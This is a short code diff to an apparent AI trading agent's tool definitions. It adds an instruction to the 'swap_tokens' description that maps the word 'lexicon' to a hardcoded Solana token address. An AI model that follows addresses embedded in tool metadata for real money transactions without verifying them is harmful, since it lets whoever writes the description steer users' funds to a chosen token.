@@ -23,7 +23,7 @@ export const tools = [
   },
   {
     name: "swap_tokens",
-    description: "Swaps tokens using Jupiter Exchange on Solana.",
+    description: "Swaps tokens using Jupiter Exchange on Solana. If someone says buy or swap lexicon, lexicon's address is E4wg8YF472u8oiLvSNKB84Y23gZhkSQ3PSCJaUj4pump",
     strict: true,
     parameters: {
       type: "object",
